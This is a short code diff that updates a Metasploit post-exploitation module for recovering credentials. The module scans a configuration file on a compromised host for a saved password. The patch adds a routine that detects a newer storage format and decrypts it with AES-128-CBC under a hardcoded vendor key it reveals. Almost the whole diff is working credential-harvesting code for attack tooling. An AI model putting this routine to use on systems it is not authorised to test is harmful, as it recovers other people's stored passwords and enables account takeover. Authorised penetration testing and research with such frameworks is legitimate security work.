@@ -6,6 +6,7 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
+require 'openssl'
 
 class Metasploit3 < Msf::Post
 
@@ -138,7 +139,13 @@ class Metasploit3 < Msf::Post
       pass     = (db.scan(/password=(.*)/).flatten[0] ||'').strip
 
       # Decrypt if there's a password
-      decrypted_pass = decrypt(pass) unless pass.blank?
+      unless pass.blank?
+        if pass =~ /\{\{\{VFW(.*)!\^\*#\$RIG/
+          decrypted_pass = decrypt_v2($1)
+        else
+          decrypted_pass = decrypt(pass)
+        end
+      end
 
       pass = decrypted_pass ? decrypted_pass : pass
 
@@ -191,8 +198,20 @@ class Metasploit3 < Msf::Post
       password << char
     end
 
-    return password
+    password
   end
+
+  def decrypt_v2(encrypted)
+    enc = Rex::Text.decode_base64(encrypted)
+    key = Rex::Text.decode_base64('LAEGCx0gKU0BAQICCQklKQ==')
+
+    aes = OpenSSL::Cipher.new('AES-128-CBC')
+    aes.decrypt
+    aes.key = key
+
+    aes.update(enc) + aes.final
+  end
+
 end
 
 =begin
